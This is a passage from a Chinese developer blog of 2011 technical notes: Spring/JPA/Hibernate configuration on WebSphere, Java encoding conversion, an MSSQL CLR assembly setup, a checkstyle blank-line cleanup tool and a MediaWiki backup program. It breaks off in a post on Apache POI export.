<h1 id="persistence-xml"><a href="#persistence-xml" class="headerlink" title="persistence.xml"></a>persistence.xml</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;persistence version=&quot;1.0&quot;</span><br><span class="line">    xmlns=&quot;http://java.sun.com/xml/ns/persistence&quot;</span><br><span class="line">    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">    xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_1_0.xsd&quot;&gt;</span><br><span class="line">    &lt;persistence-unit name=&quot;testDB&quot; transaction-type=&quot;JTA&quot;&gt;</span><br><span class="line">    &lt;provider&gt;org.hibernate.ejb.HibernatePersistence&lt;/provider&gt;</span><br><span class="line">    &lt;jta-data-source&gt;jdbc/xx&lt;/jta-data-source&gt;</span><br><span class="line">        &lt;properties&gt;</span><br><span class="line">            &lt;property name=&quot;hibernate.dialect&quot;</span><br><span class="line">                value=&quot;org.hibernate.dialect.Oracle10gDialect&quot; /&gt;</span><br><span class="line">            &lt;property name=&quot;hibernate.connection.driver_class&quot;</span><br><span class="line">                value=&quot;oracle.jdbc.pool.OracleConnectionPoolDataSource&quot; /&gt;</span><br><span class="line">            &lt;!-- property name=&quot;hibernate.transaction.factory_class&quot; value=&quot;org.hibernate.transaction.CMTTransactionFactory&quot; / --&gt;</span><br><span class="line">            &lt;property name=&quot;hibernate.transaction.manager_lookup_class&quot; value=&quot;org.hibernate.transaction.WebSphereExtendedJTATransactionLookup&quot;/&gt;</span><br><span class="line">        &lt;/properties&gt;</span><br><span class="line">    &lt;/persistence-unit&gt;</span><br><span class="line">&lt;/persistence&gt;</span><br></pre></td></tr></table></figure>

<h1 id="libs"><a href="#libs" class="headerlink" title="libs:"></a>libs:</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">antlr-2.7.6.jar</span><br><span class="line">aspectjrt.jar</span><br><span class="line">aspectjweaver.jar</span><br><span class="line">commons-beanutils.jar</span><br><span class="line">commons-collections.jar</span><br><span class="line">commons-logging.jar</span><br><span class="line">dom4j-1.6.1.jar</span><br><span class="line">hibernate-annotations.jar</span><br><span class="line">hibernate-commons-annotations.jar</span><br><span class="line">hibernate-entitymanager.jar</span><br><span class="line">hibernate3.jar</span><br><span class="line">javassist-3.4.GA.jar</span><br><span class="line">common-annotations.jar</span><br><span class="line">log4j-1.2.16.jar</span><br><span class="line">persistence.jar</span><br><span class="line">slf4j-api-1.5.0.jar</span><br><span class="line">slf4j-log4j12-1.5.0.jar</span><br><span class="line">spring-2.5.jar</span><br></pre></td></tr></table></figure>

<h1 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h1><ol>
<li>使用<code>&lt;context:component-scan&gt;</code>或<code>&lt;context:annotation-config /&gt;</code>的话，可以不用<br><code>&lt;bean class=&quot;org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor&quot; /&gt;</code></li>
<li>使用<code>&lt;tx:annotation-driven&gt;</code> + <code>&lt;tx:advice&gt;</code> + <code>&lt;aop:config&gt;</code> 可以不用 @transactional</li>
<li>WAS的TransactionManager要用WebSphereUowTransactionManager</li>
<li>hibernate.transaction.manager_lookup_class 用 org.hibernate.transaction.WebSphereExtendedJTATransactionLookup</li>
<li>hibernate.transaction.factory_class 不能使用 org.hibernate.transaction.CMTTransactionFactory，因为WAS的transaction不是一个joinableTransaction，所以只能使用org.hibernate.transaction.JDBCTransactionFactory</li>
<li>删除WEB-INF&#x2F;lib中的jta.jar，否则会出现错误。估计这个jta.jar跟WAS的有版本不兼容问题。</li>
<li>JSF集成spring<br>  web.xml<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;listener&gt;</span><br><span class="line">   &lt;listener-class&gt;org.springframework.web.context.request.RequestContextListener&lt;/listener-class&gt;</span><br><span class="line"> &lt;/listener&gt;</span><br><span class="line">faces-config.xml</span><br><span class="line"> &lt;faces-config&gt;</span><br><span class="line">   &lt;application&gt;</span><br><span class="line">     &lt;variable-resolver&gt;org.springframework.web.jsf.DelegatingVariableResolver&lt;/variable-resolver&gt;</span><br><span class="line">   &lt;/application&gt;</span><br><span class="line"> &lt;/faces-config&gt; </span><br></pre></td></tr></table></figure>
  这样就不用写Managed-Bean，但EL不能获得managedBean的数据，只能用JSF的EL读取managedBean，<br>  即不能${xBean}，只能#{xBean} </li>
<li><code>&lt;context:annotation-config /&gt;</code>支持JSR-250 annotations，即 @Resource， @PostConstruct， @PreDestroy。<br> 等价于<code>&lt;bean class=&quot;org.springframework.context.annotation.CommonAnnotationBeanPostProcessor&quot;&gt;</code><br> 而CommonAnnotationBeanPostProcessor支持 @EJB</li>
</ol>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p> <a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/websphere/techjournal/0609_alcott/0609_alcott.html">http://www.ibm.com/developerworks/websphere/techjournal/0609_alcott/0609_alcott.html</a></p>
<p> 中文：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/cn/websphere/techjournal/0609_alcott/0609_alcott.html">http://www.ibm.com/developerworks/cn/websphere/techjournal/0609_alcott/0609_alcott.html</a></li>
<li><a target="_blank" rel="noopener" href="http://www.swview.org/blog/configuring-jboss-spring-jpa-hibernate-jta-web-application">http://www.swview.org/blog/configuring-jboss-spring-jpa-hibernate-jta-web-application</a></li>
<li><a target="_blank" rel="noopener" href="http://www.infoq.com/articles/spring-2.5-part-1">http://www.infoq.com/articles/spring-2.5-part-1</a></li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Java编码转换" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-04-28T05:09:20.000Z"><a href="/2011/04/28/Java%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2/">2011-04-28</a></time>
      
      
  
    <h1 class="title"><a href="/2011/04/28/Java%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2/">Java编码转换</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="gbk-cp18030-x2F-cp936-转unicode-cp1200"><a href="#gbk-cp18030-x2F-cp936-转unicode-cp1200" class="headerlink" title="gbk(cp18030&#x2F;cp936)转unicode(cp1200)"></a>gbk(cp18030&#x2F;cp936)转unicode(cp1200)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">String str = &quot;没有任何意义的一句说话&quot;;</span><br><span class="line">for (int i = 0; i &lt; str.length(); i++) &#123;</span><br><span class="line">    String charactor = str.substring(i, i + 1);</span><br><span class="line">    byte[] b = charactor.getBytes(&quot;UTF-16BE&quot;); // 如果是UTF-16LE，则高低位翻转</span><br><span class="line">    String s1 = Integer.toHexString(b[0]).replace(&quot;ffffff&quot;, &quot;&quot;);</span><br><span class="line">    String s2 = Integer.toHexString(b[1]).replace(&quot;ffffff&quot;, &quot;&quot;);</span><br><span class="line">    if (s1.length() &lt; 2)</span><br><span class="line">        s1 = &quot;0&quot; + s1;</span><br><span class="line">    if (s2.length() &lt; 2)</span><br><span class="line">        s2 = &quot;0&quot; + s2;</span><br><span class="line">    String s = s1 + s2;</span><br><span class="line">    out.println(String.format(&quot;十六进制的表示 &amp;#x%s;&quot;, s));</span><br><span class="line">    out.println(String.format(&quot;十进制的表示   &amp;#%s;&quot;, Integer.parseInt(s, 16))); //Integer.valueOf(s, 16) or Integer.decode(&quot;0x&quot; + s)</span><br><span class="line">    out.println();</span><br><span class="line">&#125;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:&#x27;&#x27;sans serif&#x27;, tahoma, verdana, helvetica&#x27;;font-size:x-large;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size:19px;line-height:19px;white-space:normal;&quot;&gt; &lt;/span&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure>
<h1 id="numeric-character-reference-NCR"><a href="#numeric-character-reference-NCR" class="headerlink" title="numeric character reference(NCR)"></a>numeric character reference(NCR)</h1><p> 以&amp;#x03A3(16进制);或&amp;#0931(十进制);都可以在html显示unicode字符，例如:Σ<br> Python的方法会简单一些：<br> unicode(‘没有任何意义的一句说话‘,’gbk’)可以输出它的unicode编码<br> 显示十进制结果：int(‘3A3’, 16) </p>
<h1 id="还原big5文字"><a href="#还原big5文字" class="headerlink" title="还原big5文字"></a>还原big5文字</h1><p> char.txt文件保存的汉字是繁体big5编码的【書院】，但显示为【皘】 </p>
<p> 编写如下代码还原 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InputStreamReader reader = new InputStreamReader(new FileInputStream(&quot;char.txt&quot;));</span><br><span class="line">char[] chars = new char[892600];</span><br><span class="line">int len = reader.read(chars);</span><br><span class="line">String sql = new String(chars, 0, len);</span><br><span class="line">out.println(new String(sql.getBytes(), &quot;big5_hkscs&quot;));</span><br><span class="line">reader.close();</span><br></pre></td></tr></table></figure>

<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p> <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Numeric_character_reference%22%3Ehttp://en.wikipedia.org/wiki/">Numeric_character_reference</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-在MSSQL-Server-2008中创建可以访问外部资源的DLL" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-04-20T03:53:43.000Z"><a href="/2011/04/20/%E5%9C%A8MSSQL-Server-2008%E4%B8%AD%E5%88%9B%E5%BB%BA%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E5%A4%96%E9%83%A8%E8%B5%84%E6%BA%90%E7%9A%84DLL/">2011-04-20</a></time>
      
      
  
    <h1 class="title"><a href="/2011/04/20/%E5%9C%A8MSSQL-Server-2008%E4%B8%AD%E5%88%9B%E5%BB%BA%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E5%A4%96%E9%83%A8%E8%B5%84%E6%BA%90%E7%9A%84DLL/">在MSSQL Server 2008中创建可以访问外部资源的DLL</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [CharSetUtil]</span><br><span class="line">FROM &#x27;XXX.dll&#x27;</span><br><span class="line">WITH PERMISSION_SET = EXTERNAL_ACCESS</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">ALTER DATABASE [somedb] set TRUSTWORTHY on</span><br><span class="line">EXEC sp_changedbowner &#x27;sa&#x27;</span><br><span class="line"></span><br><span class="line">USE somedb</span><br><span class="line">GRANT EXTERNAL ACCESS ASSEMBLY TO sa</span><br><span class="line"></span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, &#x27;1&#x27;;</span><br><span class="line">reconfigure;</span><br><span class="line">go</span><br><span class="line"></span><br><span class="line">exec sp_configure &#x27;clr enabled&#x27;, &#x27;1&#x27;</span><br><span class="line">go</span><br><span class="line"></span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, &#x27;1&#x27;;</span><br><span class="line">go</span><br></pre></td></tr></table></figure>


<p>编写clr函数注意： </p>
<ol>
<li>静态类型static修饰的函数 </li>
<li>如果函数内部不执行sql查询，应定义DataAccessKind.None </li>
<li>最好定义IsDeterministic &#x3D; true。但如果是DataAccessKind.READ，定义确定性函数也是没有用的。</li>
</ol>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-处理UTF-8格式的java文件中的多余空行的checkstyle问题" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-04-02T05:55:35.000Z"><a href="/2011/04/02/%E5%A4%84%E7%90%86UTF-8%E6%A0%BC%E5%BC%8F%E7%9A%84java%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%A4%9A%E4%BD%99%E7%A9%BA%E8%A1%8C%E7%9A%84checkstyle%E9%97%AE%E9%A2%98/">2011-04-02</a></time>
      
      
  
    <h1 class="title"><a href="/2011/04/02/%E5%A4%84%E7%90%86UTF-8%E6%A0%BC%E5%BC%8F%E7%9A%84java%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%A4%9A%E4%BD%99%E7%A9%BA%E8%A1%8C%E7%9A%84checkstyle%E9%97%AE%E9%A2%98/">处理UTF-8格式的java文件中的多余空行的checkstyle问题</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">package test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class RemoveBlacket</span><br><span class="line">&#123;</span><br><span class="line">  public static void main(String[] args)</span><br><span class="line">      throws Exception</span><br><span class="line">  &#123;</span><br><span class="line">    for (String file : listPath())</span><br><span class="line">    &#123;</span><br><span class="line">      System.out.println(file);</span><br><span class="line">      proces(file);</span><br><span class="line">    &#125;</span><br><span class="line">    //    test();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  static void test()</span><br><span class="line">      throws Exception</span><br><span class="line">  &#123;</span><br><span class="line">    String file = &quot;C:\\Temp.java&quot;;</span><br><span class="line">    FileInputStream in = new FileInputStream(file);</span><br><span class="line">    byte[] bytes = new byte[81920000];</span><br><span class="line">    int len = in.read(bytes);</span><br><span class="line">    String content = new String(bytes, 0, len, &quot;UTF-8&quot;); // 以UTF-8格式处理内容</span><br><span class="line">    content = content.replaceAll(&quot;\r\n(\r\n\\s+\\&#125;)&quot;, &quot;$1&quot;);</span><br><span class="line">    in.close();</span><br><span class="line"></span><br><span class="line">    FileOutputStream out = new FileOutputStream(&quot;C:/text.java&quot;);</span><br><span class="line">    //    OutputStreamWriter writer = new OutputStreamWriter(out);</span><br><span class="line">    System.out.println(content);</span><br><span class="line">    out.write(content.getBytes(&quot;UTF-8&quot;));; // 还原UTF-8格式内容</span><br><span class="line"></span><br><span class="line">    //    writer.close();</span><br><span class="line">    out.close();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  static void proces(String file)</span><br><span class="line">      throws Exception</span><br><span class="line">  &#123;</span><br><span class="line">    FileInputStream in = new FileInputStream(file);</span><br><span class="line">    byte[] bytes = new byte[80920000];</span><br><span class="line">    int len = in.read(bytes);</span><br><span class="line">    String content = new String(bytes, 0, len, &quot;UTF-8&quot;);// 以UTF-8格式处理内容</span><br><span class="line">    content = content.replaceAll(&quot;\r\n(\r\n\\s+\\&#125;)&quot;, &quot;$1&quot;);</span><br><span class="line">    in.close();</span><br><span class="line"></span><br><span class="line">    FileOutputStream out = new FileOutputStream(file);</span><br><span class="line">    //    System.out.println(content);</span><br><span class="line">    out.write(content.getBytes(&quot;UTF-8&quot;));// 还原UTF-8格式内容</span><br><span class="line"></span><br><span class="line">    out.close();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  static List&lt;String&gt; listPath()</span><br><span class="line">      throws Exception</span><br><span class="line">  &#123;</span><br><span class="line">    List&lt;String&gt; list = new ArrayList&lt;String&gt;();</span><br><span class="line">    BufferedReader reader = new BufferedReader(new FileReader(&quot;c:/checkstyle-list.txt&quot;));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = reader.readLine()) != null)</span><br><span class="line">    &#123;</span><br><span class="line">      list.add(line);</span><br><span class="line">    &#125;</span><br><span class="line">    reader.close();</span><br><span class="line"></span><br><span class="line">    return list;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-用kyotocabinet备份MediaWiki数据" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-04-01T07:23:26.000Z"><a href="/2011/04/01/%E7%94%A8kyotocabinet%E5%A4%87%E4%BB%BDMediaWiki%E6%95%B0%E6%8D%AE/">2011-04-01</a></time>
      
      
  
    <h1 class="title"><a href="/2011/04/01/%E7%94%A8kyotocabinet%E5%A4%87%E4%BB%BDMediaWiki%E6%95%B0%E6%8D%AE/">用kyotocabinet备份MediaWiki数据</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">package jay;</span><br><span class="line"></span><br><span class="line">import static java.lang.System.out;</span><br><span class="line"></span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line"></span><br><span class="line">import kyotocabinet.Cursor;</span><br><span class="line">import kyotocabinet.DB;</span><br><span class="line"></span><br><span class="line">public class TakeBack &#123;</span><br><span class="line">  static Connection conn;</span><br><span class="line">  static &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">      conn = DriverManager.getConnection(</span><br><span class="line">          &quot;jdbc:mysql://DBServer:3306/wiki&quot;, &quot;user&quot;, &quot;passwd&quot;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  static void showHashDB() &#123;</span><br><span class="line">    DB db = new DB();</span><br><span class="line">    if (!db.open(&quot;witube.kch&quot;, DB.OWRITER | DB.OCREATE)) &#123;</span><br><span class="line">      System.err.println(&quot;open error: &quot; + db.error());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Cursor cur = db.cursor();</span><br><span class="line">    cur.jump();</span><br><span class="line">    String[] rec;</span><br><span class="line">    while ((rec = cur.get_str(true)) != null) &#123;</span><br><span class="line">      System.out.println(rec[0] + &quot;:&quot; + rec[1]);</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    cur.disable();</span><br><span class="line">    if (!db.close()) &#123;</span><br><span class="line">      System.err.println(&quot;close error: &quot; + db.error());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  static void backupMediawiki() throws Exception &#123;</span><br><span class="line">    DB db = new DB();</span><br><span class="line">    if (!db.open(&quot;witube.kch&quot;, DB.OWRITER | DB.OCREATE)) &#123;</span><br><span class="line">      System.err.println(&quot;open error: &quot; + db.error());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String sql = &quot;SELECT page_title, old_text FROM `page` p, revision r, text t WHERE page_latest = r.rev_id and r.rev_text_id = t.old_id and page_namespace = 0&quot;;</span><br><span class="line">    Statement stmt = conn.createStatement();</span><br><span class="line">    ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">    while (rs.next()) &#123;</span><br><span class="line">      InputStream in = rs.getBlob(1).getBinaryStream();</span><br><span class="line">      byte[] bytes = new byte[89200000];</span><br><span class="line">      int len = in.read(bytes);</span><br><span class="line">      String title = new String(bytes, 0, len, &quot;UTF-8&quot;);</span><br><span class="line">      in.close();</span><br><span class="line"></span><br><span class="line">      in = rs.getBlob(2).getBinaryStream();</span><br><span class="line">      len = in.read(bytes);</span><br><span class="line">      if (len == -1) &#123;</span><br><span class="line">        out.println(&quot;标题：&quot; + title + &quot; 没有内容。&quot;);</span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br><span class="line">      String content = new String(bytes, 0, len, &quot;UTF-8&quot;);</span><br><span class="line">      in.close();</span><br><span class="line">      // out.println(&quot;title: &quot; + title + &quot; content: &quot; + content);</span><br><span class="line"></span><br><span class="line">      db.set(title, content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rs.close();</span><br><span class="line">    stmt.close();</span><br><span class="line">    conn.close();</span><br><span class="line">    if (!db.close()) &#123;</span><br><span class="line">      System.err.println(&quot;close error: &quot; + db.error());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    backupMediawiki();</span><br><span class="line">    showHashDB();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-apache-POI-+-中文过滤-导出MSSQL-Server的数据" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-04-01T04:13:53.000Z"><a href="/2011/04/01/apache-POI-+-%E4%B8%AD%E6%96%87%E8%BF%87%E6%BB%A4-%E5%AF%BC%E5%87%BAMSSQL-Server%E7%9A%84%E6%95%B0%E6%8D%AE/">2011-04-01</a></time>
      
      
  
    <h1 class="title"><a href="/2011/04/01/apache-POI-+-%E4%B8%AD%E6%96%87%E8%BF%87%E6%BB%A4-%E5%AF%BC%E5%87%BAMSSQL-Server%E7%9A%84%E6%95%B0%E6%8D%AE/">apache POI + 中文过滤 导出MSSQL Server的数据</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 